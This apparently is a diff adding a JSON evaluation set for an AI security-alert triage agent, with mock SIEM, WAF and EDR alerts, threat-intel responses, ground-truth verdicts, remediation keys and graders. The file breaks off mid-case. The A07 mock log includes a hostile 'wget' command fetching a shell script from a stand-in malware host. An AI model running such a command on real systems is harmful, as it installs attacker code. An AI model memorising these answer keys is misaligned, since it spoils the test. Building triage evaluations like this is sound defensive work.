@@ -1,0 +1,3344 @@
+[
+  {
+    "test_case_id": "A01",
+    "scenario": "外部 IP 对 SSH 服务进行暴力破解并成功登录",
+    "difficulty": "easy",
+    "is_positive": true,
+    "expected_severity": "high",
+    "expected_attack_type": "brute_force",
+    "input": {
+      "alert_id": "A01",
+      "trigger_context": "SIEM 检测到来自外部 IP 192.0.2.35 的大量 SSH 登录失败，随后出现成功登录，触发暴力破解告警。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A01": {
+        "alert_id": "A01",
+        "severity_original": "high",
+        "rule_name": "SSH Brute Force - Multiple Failed Attempts Followed by Success",
+        "source": "SIEM-Core",
+        "timestamp": "2026-07-11T03:15:42Z",
+        "raw_log": "sshd[28901]: Failed password for root from 192.0.2.35 port 52341 ssh2 ... Accepted password for root from 192.0.2.35 port 52341 ssh2",
+        "source_ip": "192.0.2.35",
+        "destination_ip": "10.0.1.12",
+        "source_port": 52341,
+        "destination_port": 22,
+        "protocol": "TCP",
+        "payload_highlights": ["15 failed login attempts in 5 minutes", "followed by 1 successful root login"],
+        "related_iocs": [
+          { "type": "ip", "value": "192.0.2.35" }
+        ]
+      },
+      "query_asset_info_10.0.1.12": {
+        "ip": "10.0.1.12",
+        "hostname": "prod-web-01",
+        "os": "Ubuntu 22.04 LTS",
+        "department": "核心业务部",
+        "business_system": "在线交易系统",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "ops@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["web", "production"]
+      },
+      "query_threat_intel_ip_192.0.2.35": {
+        "ioc_type": "ip",
+        "ioc_value": "192.0.2.35",
+        "is_malicious": true,
+        "reputation_score": 12,
+        "threat_tags": ["brute_force", "scanning"],
+        "associated_apt": null,
+        "first_seen": "2026-06-20",
+        "last_seen": "2026-07-11",
+        "geo_location": "RU",
+        "source": "AlienVault OTX, AbuseIPDB",
+        "confidence": "high",
+        "raw_intel": "This IP has been observed performing SSH brute-force attacks against multiple targets globally. Associated with automated attack infrastructure."
+      },
+      "query_related_alerts_192.0.2.35_48h": {
+        "query_params": { "ip": "192.0.2.35", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "high",
+        "attack_type": "brute_force",
+        "min_confidence": 0.85,
+        "key_evidence_must_include": [
+          "源 IP 192.0.2.35 在威胁情报中被标记为暴力破解节点，声誉分仅 12",
+          "原始日志中记录 15 次失败登录后成功登录 root 账户",
+          "目标资产 10.0.1.12 为核心业务系统，受影响严重"
+        ],
+        "key_evidence_must_not_include": ["该告警为误报", "源 IP 为非恶意扫描器"]
+      },
+      "expected_remediation_must_include": [
+        "在防火墙策略中添加规则：deny src 192.0.2.35/32 dst 10.0.1.12/32 port 22",
+        "立即重置 root 密码，并禁止 root 直接 SSH 登录",
+        "检查 /var/log/auth.log 确认入侵者执行的操作，进行主机取证"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "transcript 中必须包含 query_alert_detail 和 query_threat_intel 的调用记录" },
+      { "type": "code", "check": "output_schema", "rule": "输出必须是合法 JSON，包含 alert_id、judgment（含 severity/attack_type/confidence/summary/evidence_chain/iocs）、remediation、metadata（含 tools_called）四个顶层字段" },
+      { "type": "code", "check": "severity_enum", "rule": "judgment.severity 的值必须是 critical|high|medium|low|false_positive 之一" },
+      { "type": "code", "check": "confidence_range", "rule": "judgment.confidence 必须是 0-1 之间的浮点数" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "remediation 数组长度 ≥ 1，且每条长度 ≥ 10 字符" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三个维度分别评分：(1) severity_rationality：严重度定级是否与 mock API 返回的数据一致；(2) remediation_actionability：处置建议是否具体、可执行、按优先级排序；(3) evidence_completeness：evidence_chain 是否覆盖了所有关键 IOC 和行为特征", "model": "gpt-4o-mini", "temperature": 0, "few_shot_examples": 3, "escape_hatch": "当 mock API 数据不足以支持判断时，允许返回 'uncertain'" },
+      { "type": "model", "check": "hallucination_check", "rubric": "逐条检查 evidence_chain 中的每一条陈述，判断其是否可以从 mock API 返回数据、输入信息或公开安全知识中独立验证。任何无法追溯到以上来源的声明标记为 hallucination。", "model": "gpt-4o-mini", "temperature": 0, "escape_hatch": "允许返回 'uncertain' 用于无法完全确定的情况" },
+      { "type": "human", "check": "spot_check", "trigger": "每 10 条测试随机抽取 1 条进行人工评审", "reviewer": "安全分析师", "review_dimensions": ["研判结论的实操合理性", "处置建议是否贴近生产环境 SOP", "LLM Judge 评分是否与人工判断一致"] }
+    ]
+  },
+  {
+    "test_case_id": "A02",
+    "scenario": "检测到 WebShell 文件上传成功",
+    "difficulty": "easy",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "webshell",
+    "input": {
+      "alert_id": "A02",
+      "trigger_context": "WAF 告警：发现文件上传漏洞，攻击者上传了疑似 WebShell 文件 /uploads/shell.php，源 IP 198.51.100.17。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A02": {
+        "alert_id": "A02",
+        "severity_original": "critical",
+        "rule_name": "WebShell Upload - Suspicious PHP File Detected",
+        "source": "WAF",
+        "timestamp": "2026-07-12T08:22:10Z",
+        "raw_log": "POST /upload.php HTTP/1.1 200 345 ... multipart/form-data filename=shell.php content-type=application/x-php",
+        "source_ip": "198.51.100.17",
+        "destination_ip": "10.0.2.5",
+        "source_port": 44321,
+        "destination_port": 443,
+        "protocol": "TCP",
+        "payload_highlights": ["filename shell.php matches WebShell signature", "PHP code contains eval(base64_decode(...))"],
+        "related_iocs": [
+          { "type": "ip", "value": "198.51.100.17" },
+          { "type": "hash", "value": "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9" }
+        ]
+      },
+      "query_asset_info_10.0.2.5": {
+        "ip": "10.0.2.5",
+        "hostname": "cms-portal-01",
+        "os": "CentOS 7.9",
+        "department": "市场部",
+        "business_system": "公司官网 CMS",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "webmaster@company.com",
+        "network_zone": "生产-DMZ",
+        "tags": ["web", "public-facing"]
+      },
+      "query_threat_intel_ip_198.51.100.17": {
+        "ioc_type": "ip",
+        "ioc_value": "198.51.100.17",
+        "is_malicious": true,
+        "reputation_score": 8,
+        "threat_tags": ["webshell", "exploit"],
+        "associated_apt": null,
+        "first_seen": "2026-07-01",
+        "last_seen": "2026-07-12",
+        "geo_location": "CN",
+        "source": "VirusTotal, EmergingThreats",
+        "confidence": "high",
+        "raw_intel": "IP observed uploading WebShells to vulnerable web servers. Associated with multiple defacement incidents."
+      },
+      "query_threat_intel_hash_d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9": {
+        "ioc_type": "hash",
+        "ioc_value": "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9",
+        "is_malicious": true,
+        "reputation_score": 5,
+        "threat_tags": ["webshell", "trojan"],
+        "associated_apt": null,
+        "first_seen": "2026-06-15",
+        "last_seen": "2026-07-12",
+        "geo_location": null,
+        "source": "VirusTotal, HybridAnalysis",
+        "confidence": "high",
+        "raw_intel": "SHA256 hash identified as China Chopper WebShell variant. Allows remote command execution and file management."
+      },
+      "query_related_alerts_198.51.100.17_48h": {
+        "query_params": { "ip": "198.51.100.17", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "webshell",
+        "min_confidence": 0.90,
+        "key_evidence_must_include": [
+          "上传文件 shell.php 的哈希被威胁情报确认为 WebShell 变种 China Chopper",
+          "源 IP 198.51.100.17 在情报中标记为 WebShell 上传攻击者",
+          "目标资产 10.0.2.5 是对公网开放的 CMS 服务器，位于 DMZ 区域"
+        ],
+        "key_evidence_must_not_include": ["该 WebShell 是非恶意的管理工具", "文件上传属于正常业务操作"]
+      },
+      "expected_remediation_must_include": [
+        "立即隔离 10.0.2.5 网络连接，删除 /uploads/shell.php 文件",
+        "在 WAF 中添加规则阻止 198.51.100.17 访问",
+        "检查服务器是否有其他后门、新增账户或计划任务"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "transcript 中必须包含 query_alert_detail 和 query_threat_intel 的调用记录" },
+      { "type": "code", "check": "output_schema", "rule": "输出必须是合法 JSON，包含 alert_id、judgment（含 severity/attack_type/confidence/summary/evidence_chain/iocs）、remediation、metadata（含 tools_called）四个顶层字段" },
+      { "type": "code", "check": "severity_enum", "rule": "judgment.severity 的值必须是 critical|high|medium|low|false_positive 之一" },
+      { "type": "code", "check": "confidence_range", "rule": "judgment.confidence 必须是 0-1 之间的浮点数" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "remediation 数组长度 ≥ 1，且每条长度 ≥ 10 字符" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三个维度分别评分：(1) severity_rationality；(2) remediation_actionability；(3) evidence_completeness", "model": "gpt-4o-mini", "temperature": 0, "few_shot_examples": 3, "escape_hatch": "当 mock API 数据不足以支持判断时，允许返回 'uncertain'" },
+      { "type": "model", "check": "hallucination_check", "rubric": "逐条检查 evidence_chain 中的每一条陈述，判断其是否可以从 mock API 返回数据、输入信息或公开安全知识中独立验证。", "model": "gpt-4o-mini", "temperature": 0, "escape_hatch": "允许返回 'uncertain'" },
+      { "type": "human", "check": "spot_check", "trigger": "每 10 条测试随机抽取 1 条", "reviewer": "安全分析师", "review_dimensions": ["研判结论的实操合理性", "处置建议是否贴近生产环境 SOP", "LLM Judge 评分是否与人工判断一致"] }
+    ]
+  },
+  {
+    "test_case_id": "A03",
+    "scenario": "内网主机向已知 C2 域名发起 DNS 请求",
+    "difficulty": "easy",
+    "is_positive": true,
+    "expected_severity": "high",
+    "expected_attack_type": "c2_communication",
+    "input": {
+      "alert_id": "A03",
+      "trigger_context": "EDR 检测到主机 10.0.3.17 反复解析恶意域名 evil-c2.xyz，疑似 C2 信标。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A03": {
+        "alert_id": "A03",
+        "severity_original": "high",
+        "rule_name": "Suspicious DNS Query - Known C2 Domain Detected",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-13T12:05:33Z",
+        "raw_log": "Process svchost.exe (PID 1340) made DNS query for evil-c2.xyz, returned 198.51.100.55",
+        "source_ip": "10.0.3.17",
+        "destination_ip": "10.0.0.53",
+        "source_port": 53721,
+        "destination_port": 53,
+        "protocol": "UDP",
+        "payload_highlights": ["domain evil-c2.xyz matches threat intel C2 feed", "repeated queries every 60 seconds"],
+        "related_iocs": [
+          { "type": "domain", "value": "evil-c2.xyz" },
+          { "type": "ip", "value": "198.51.100.55" }
+        ]
+      },
+      "query_asset_info_10.0.3.17": {
+        "ip": "10.0.3.17",
+        "hostname": "fin-workstation-09",
+        "os": "Windows 10 22H2",
+        "department": "财务部",
+        "business_system": "财务专用终端",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "zhang.san@company.com",
+        "network_zone": "办公网",
+        "tags": ["workstation", "finance"]
+      },
+      "query_threat_intel_domain_evil-c2.xyz": {
+        "ioc_type": "domain",
+        "ioc_value": "evil-c2.xyz",
+        "is_malicious": true,
+        "reputation_score": 3,
+        "threat_tags": ["C2", "botnet"],
+        "associated_apt": "Lazarus Group",
+        "first_seen": "2026-06-01",
+        "last_seen": "2026-07-13",
+        "geo_location": "KP",
+        "source": "ThreatConnect, Mandiant",
+        "confidence": "high",
+        "raw_intel": "This domain is a known C2 channel used by Lazarus Group for post-exploitation command and control. Frequently observed in Operation Dream Job campaigns."
+      },
+      "query_threat_intel_ip_198.51.100.55": {
+        "ioc_type": "ip",
+        "ioc_value": "198.51.100.55",
+        "is_malicious": true,
+        "reputation_score": 10,
+        "threat_tags": ["C2", "botnet"],
+        "associated_apt": "Lazarus Group",
+        "first_seen": "2026-06-01",
+        "last_seen": "2026-07-13",
+        "geo_location": "KP",
+        "source": "ThreatConnect",
+        "confidence": "high",
+        "raw_intel": "IP resolves from evil-c2.xyz, used as C2 server for Lazarus group malware."
+      },
+      "query_related_alerts_10.0.3.17_48h": {
+        "query_params": { "ip": "10.0.3.17", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "high",
+        "attack_type": "c2_communication",
+        "min_confidence": 0.90,
+        "key_evidence_must_include": [
+          "域名 evil-c2.xyz 被威胁情报标记为 Lazarus 组织 C2 节点",
+          "解析 IP 198.51.100.55 同为 C2 服务器",
+          "内网主机 10.0.3.17 属于财务部，高价值目标"
+        ],
+        "key_evidence_must_not_include": ["该 DNS 请求为正常软件更新查询", "C2 通信是安全研究团队的测试"]
+      },
+      "expected_remediation_must_include": [
+        "立即隔离主机 10.0.3.17 网络，断网关机",
+        "在 DNS 防火墙上封锁 evil-c2.xyz 及关联 IP",
+        "提取主机内存和磁盘镜像进行入侵分析，排查后门"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "transcript 中必须包含 query_alert_detail 和 query_threat_intel 的调用记录" },
+      { "type": "code", "check": "output_schema", "rule": "输出必须是合法 JSON，包含 alert_id、judgment、remediation、metadata 四个顶层字段" },
+      { "type": "code", "check": "severity_enum", "rule": "judgment.severity 的值必须是 critical|high|medium|low|false_positive 之一" },
+      { "type": "code", "check": "confidence_range", "rule": "judgment.confidence 必须是 0-1 之间的浮点数" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "remediation 数组长度 ≥ 1，且每条长度 ≥ 10 字符" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三个维度分别评分", "model": "gpt-4o-mini", "temperature": 0, "few_shot_examples": 3, "escape_hatch": "允许返回 'uncertain'" },
+      { "type": "model", "check": "hallucination_check", "rubric": "逐条检查 evidence_chain 陈述是否可验证", "model": "gpt-4o-mini", "temperature": 0, "escape_hatch": "允许返回 'uncertain'" },
+      { "type": "human", "check": "spot_check", "trigger": "每 10 条测试随机抽取 1 条", "reviewer": "安全分析师", "review_dimensions": ["研判结论的实操合理性", "处置建议是否贴近生产环境 SOP", "LLM Judge 评分是否与人工判断一致"] }
+    ]
+  },
+  {
+    "test_case_id": "A04",
+    "scenario": "外部 IP 对内网进行端口扫描",
+    "difficulty": "easy",
+    "is_positive": true,
+    "expected_severity": "medium",
+    "expected_attack_type": "scanning",
+    "input": {
+      "alert_id": "A04",
+      "trigger_context": "防火墙检测到外部 IP 203.0.113.88 对 DMZ 网段 10.0.2.0/24 进行快速端口扫描。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A04": {
+        "alert_id": "A04",
+        "severity_original": "medium",
+        "rule_name": "Port Scan - Rapid Connection Attempts to Multiple Ports",
+        "source": "SIEM-Core",
+        "timestamp": "2026-07-10T14:30:22Z",
+        "raw_log": "FW-ACCEPT drop: src=203.0.113.88 dst=10.0.2.10:80,tcp... 10.0.2.11:443... 10.0.2.12:8080... (120 probes in 30 sec)",
+        "source_ip": "203.0.113.88",
+        "destination_ip": "10.0.2.10",
+        "source_port": 54321,
+        "destination_port": 80,
+        "protocol": "TCP",
+        "payload_highlights": ["120 connection attempts to 15 different IPs in 30 seconds", "targeting web ports 80,443,8080,8443"],
+        "related_iocs": [
+          { "type": "ip", "value": "203.0.113.88" }
+        ]
+      },
+      "query_asset_info_10.0.2.10": {
+        "ip": "10.0.2.10",
+        "hostname": "dmz-web-02",
+        "os": "Ubuntu 20.04",
+        "department": "核心业务部",
+        "business_system": "外部 API 网关",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "apis@company.com",
+        "network_zone": "生产-DMZ",
+        "tags": ["api", "dmz"]
+      },
+      "query_threat_intel_ip_203.0.113.88": {
+        "ioc_type": "ip",
+        "ioc_value": "203.0.113.88",
+        "is_malicious": true,
+        "reputation_score": 25,
+        "threat_tags": ["scanning", "reconnaissance"],
+        "associated_apt": null,
+        "first_seen": "2026-07-08",
+        "last_seen": "2026-07-10",
+        "geo_location": "US",
+        "source": "AbuseIPDB",
+        "confidence": "medium",
+        "raw_intel": "IP observed scanning for exposed web services. No exploitation confirmed yet."
+      },
+      "query_related_alerts_203.0.113.88_48h": {
+        "query_params": { "ip": "203.0.113.88", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "medium",
+        "attack_type": "scanning",
+        "min_confidence": 0.75,
+        "key_evidence_must_include": [
+          "源 IP 203.0.113.88 在 30 秒内探测了 15 个 DMZ 目标的 Web 端口",
+          "威胁情报确认该 IP 有扫描前科，未发现后续利用行为"
+        ],
+        "key_evidence_must_not_include": ["该扫描是内部授权的安全审计活动"]
+      },
+      "expected_remediation_must_include": [
+        "临时封锁 IP 203.0.113.88 72 小时",
+        "审查 DMZ 中暴露的 Web 服务是否存在未授权访问漏洞",
+        "增强防火墙速率限制策略防止扫描"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "transcript 中必须包含 query_alert_detail 和 query_threat_intel 的调用记录" },
+      { "type": "code", "check": "output_schema", "rule": "输出必须是合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "judgment.severity 的值必须是枚举值之一" },
+      { "type": "code", "check": "confidence_range", "rule": "judgment.confidence 必须是 0-1 之间的浮点数" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "remediation 数组长度 ≥ 1，且每条长度 ≥ 10 字符" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三个维度分别评分", "model": "gpt-4o-mini", "temperature": 0, "few_shot_examples": 3 },
+      { "type": "model", "check": "hallucination_check", "rubric": "逐条检查 evidence_chain 是否可验证", "model": "gpt-4o-mini", "temperature": 0 },
+      { "type": "human", "check": "spot_check", "trigger": "每 10 条随机抽 1 条" }
+    ]
+  },
+  {
+    "test_case_id": "A05",
+    "scenario": "内部授权漏洞扫描器触发端口扫描告警（误报）",
+    "difficulty": "easy",
+    "is_positive": false,
+    "expected_severity": "false_positive",
+    "expected_attack_type": "scanning",
+    "input": {
+      "alert_id": "A05",
+      "trigger_context": "SIEM 产生端口扫描告警，源 IP 10.0.5.100 对多个内部系统进行扫描，但实际是该网段内的授权漏扫设备。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A05": {
+        "alert_id": "A05",
+        "severity_original": "medium",
+        "rule_name": "Internal Port Scan Detected",
+        "source": "SIEM-Core",
+        "timestamp": "2026-07-11T02:00:15Z",
+        "raw_log": "internal host 10.0.5.100 scanned 10.0.1.0/24 ports 1-1024",
+        "source_ip": "10.0.5.100",
+        "destination_ip": "10.0.1.20",
+        "source_port": null,
+        "destination_port": null,
+        "protocol": "TCP",
+        "payload_highlights": ["sequential port scan of common services"],
+        "related_iocs": [
+          { "type": "ip", "value": "10.0.5.100" }
+        ]
+      },
+      "query_asset_info_10.0.5.100": {
+        "ip": "10.0.5.100",
+        "hostname": "sec-scanner-01",
+        "os": "Kali Linux 2024.2",
+        "department": "信息安全部",
+        "business_system": "内部漏洞扫描平台",
+        "asset_level": "medium",
+        "is_scanner": true,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "security.ops@company.com",
+        "network_zone": "办公网",
+        "tags": ["scanner", "authorized", "security"]
+      },
+      "query_threat_intel_ip_10.0.5.100": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.5.100",
+        "is_malicious": false,
+        "reputation_score": 100,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal Asset DB",
+        "confidence": "high",
+        "raw_intel": "This IP is an internal asset managed by Security Operations team, used for authorized vulnerability scanning."
+      },
+      "query_related_alerts_10.0.5.100_48h": {
+        "query_params": { "ip": "10.0.5.100", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_asset_info"],
+      "expected_judgment": {
+        "severity": "false_positive",
+        "attack_type": "none",
+        "min_confidence": 0.95,
+        "key_evidence_must_include": [
+          "源 IP 10.0.5.100 资产标签为 is_scanner=true，归属信息安全部",
+          "威胁情报未发现该 IP 的恶意行为，声誉分满分",
+          "扫描行为与内部定期漏扫任务时间吻合"
+        ],
+        "key_evidence_must_not_include": ["存在外部攻击者扫描", "该扫描造成了实际入侵"]
+      },
+      "expected_remediation_must_include": [
+        "将此告警标记为误报，反馈到 SIEM 规则调优，将 sec-scanner-01 加入白名单"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "transcript 中必须包含 query_alert_detail 和 query_asset_info 的调用记录" },
+      { "type": "code", "check": "output_schema", "rule": "输出必须是合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "judgment.severity 的值必须是枚举值之一" },
+      { "type": "code", "check": "confidence_range", "rule": "judgment.confidence 必须是 0-1 之间的浮点数" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "remediation 数组长度 ≥ 1" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三个维度评分", "model": "gpt-4o-mini", "temperature": 0 },
+      { "type": "model", "check": "hallucination_check", "rubric": "逐条检查证据是否可验证", "model": "gpt-4o-mini", "temperature": 0 },
+      { "type": "human", "check": "spot_check", "trigger": "每 10 条随机抽 1 条" }
+    ]
+  },
+  {
+    "test_case_id": "A06",
+    "scenario": "内部钓鱼邮件演练触发恶意 URL 告警（误报）",
+    "difficulty": "easy",
+    "is_positive": false,
+    "expected_severity": "false_positive",
+    "expected_attack_type": "phishing",
+    "input": {
+      "alert_id": "A06",
+      "trigger_context": "EDR 告警：员工点击了邮件中的恶意链接 http://phish-test.internal/ ，但该链接实际是安全部门组织的钓鱼演练。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A06": {
+        "alert_id": "A06",
+        "severity_original": "high",
+        "rule_name": "Phishing Link Clicked - Malicious URL Detected",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-12T10:15:00Z",
+        "raw_log": "User jane.doe opened URL http://phish-test.internal/ from Outlook. URL categorized as phishing by threat feed.",
+        "source_ip": "10.0.3.45",
+        "destination_ip": "10.0.5.200",
+        "source_port": 50001,
+        "destination_port": 80,
+        "protocol": "TCP",
+        "payload_highlights": ["URL http://phish-test.internal/ matches phishing signature"],
+        "related_iocs": [
+          { "type": "url", "value": "http://phish-test.internal/" }
+        ]
+      },
+      "query_asset_info_10.0.3.45": {
+        "ip": "10.0.3.45",
+        "hostname": "hr-workstation-12",
+        "os": "Windows 11",
+        "department": "人力资源部",
+        "business_system": "HR 办公终端",
+        "asset_level": "low",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "jane.doe@company.com",
+        "network_zone": "办公网",
+        "tags": ["workstation", "hr"]
+      },
+      "query_threat_intel_url_http://phish-test.internal/": {
+        "ioc_type": "url",
+        "ioc_value": "http://phish-test.internal/",
+        "is_malicious": false,
+        "reputation_score": 95,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal Security Awareness Platform",
+        "confidence": "high",
+        "raw_intel": "URL is part of internal phishing simulation campaign run by Security Awareness team. Not a real threat."
+      },
+      "query_related_alerts_10.0.3.45_48h": {
+        "query_params": { "ip": "10.0.3.45", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "false_positive",
+        "attack_type": "none",
+        "min_confidence": 0.95,
+        "key_evidence_must_include": [
+          "URL http://phish-test.internal/ 来自内部钓鱼演练平台，威胁情报明确标识为非恶意",
+          "资产属于 HR 员工，与演练受众一致"
+        ],
+        "key_evidence_must_not_include": ["员工遭受真实 APT 钓鱼攻击", "需要紧急阻断该域名"]
+      },
+      "expected_remediation_must_include": [
+        "确认钓鱼演练计划，将告警标记为演练触发误报",
+        "优化 EDR 策略排除演练 URL 列表"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 query_alert_detail 和 query_threat_intel" },
+      { "type": "code", "check": "output_schema", "rule": "输出合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举值" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "长度≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini", "temperature": 0 },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证证据", "model": "gpt-4o-mini", "temperature": 0 },
+      { "type": "human", "check": "spot_check", "trigger": "每 10 条抽 1" }
+    ]
+  },
+  {
+    "test_case_id": "A07",
+    "scenario": "外部 IP 利用已知漏洞 CVE-2024-1234 攻击 Web 服务器",
+    "difficulty": "easy",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "exploitation",
+    "input": {
+      "alert_id": "A07",
+      "trigger_context": "WAF 检测到针对 /api/vulnerable 的恶意请求，包含 CVE-2024-1234 RCE 利用载荷，源 IP 203.0.113.77。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A07": {
+        "alert_id": "A07",
+        "severity_original": "critical",
+        "rule_name": "CVE-2024-1234 - Remote Code Execution Attempt",
+        "source": "WAF",
+        "timestamp": "2026-07-13T16:48:03Z",
+        "raw_log": "POST /api/vulnerable HTTP/1.1 ... payload: ... cmd=wget http://malware.cn/shell.sh ...",
+        "source_ip": "203.0.113.77",
+        "destination_ip": "10.0.2.15",
+        "source_port": 45234,
+        "destination_port": 443,
+        "protocol": "TCP",
+        "payload_highlights": ["exploit targeting CVE-2024-1234 in Java deserialization", "payload attempts to download shell script"],
+        "related_iocs": [
+          { "type": "ip", "value": "203.0.113.77" },
+          { "type": "url", "value": "http://malware.cn/shell.sh" }
+        ]
+      },
+      "query_asset_info_10.0.2.15": {
+        "ip": "10.0.2.15",
+        "hostname": "app-srv-05",
+        "os": "Red Hat Enterprise Linux 8.6",
+        "department": "研发中心",
+        "business_system": "核心业务 API 服务",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "devops@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["api", "production", "critical"]
+      },
+      "query_threat_intel_ip_203.0.113.77": {
+        "ioc_type": "ip",
+        "ioc_value": "203.0.113.77",
+        "is_malicious": true,
+        "reputation_score": 5,
+        "threat_tags": ["exploit", "C2"],
+        "associated_apt": null,
+        "first_seen": "2026-07-05",
+        "last_seen": "2026-07-13",
+        "geo_location": "CN",
+        "source": "VirusTotal, GreyNoise",
+        "confidence": "high",
+        "raw_intel": "IP actively scanning for and exploiting CVE-2024-1234. Associated with deployment of Mirai variants."
+      },
+      "query_threat_intel_url_http://malware.cn/shell.sh": {
+        "ioc_type": "url",
+        "ioc_value": "http://malware.cn/shell.sh",
+        "is_malicious": true,
+        "reputation_score": 7,
+        "threat_tags": ["trojan", "downloader"],
+        "associated_apt": null,
+        "first_seen": "2026-07-01",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "URLhaus",
+        "confidence": "high",
+        "raw_intel": "URL hosts a malicious shell script that downloads additional payloads. Commonly used after RCE exploitation."
+      },
+      "query_related_alerts_203.0.113.77_48h": {
+        "query_params": { "ip": "203.0.113.77", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "exploitation",
+        "min_confidence": 0.90,
+        "key_evidence_must_include": [
+          "攻击载荷针对 CVE-2024-1234 反序列化 RCE",
+          "源 IP 203.0.113.77 被情报标记为活跃漏洞利用节点",
+          "恶意 URL http://malware.cn/shell.sh 为下载后门脚本",
+          "目标资产为核心 API 服务器，宕机影响严重"
+        ],
+        "key_evidence_must_not_include": ["漏洞利用未成功", "载荷无害"]
+      },
+      "expected_remediation_must_include": [
+        "紧急封禁 IP 203.0.113.77 和域名 malware.cn",
+        "立即修补 CVE-2024-1234 漏洞，部署虚拟补丁",
+        "检查 10.0.2.15 是否已被入侵，搜索 wget、curl 下载文件痕迹"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 query_alert_detail 和 query_threat_intel" },
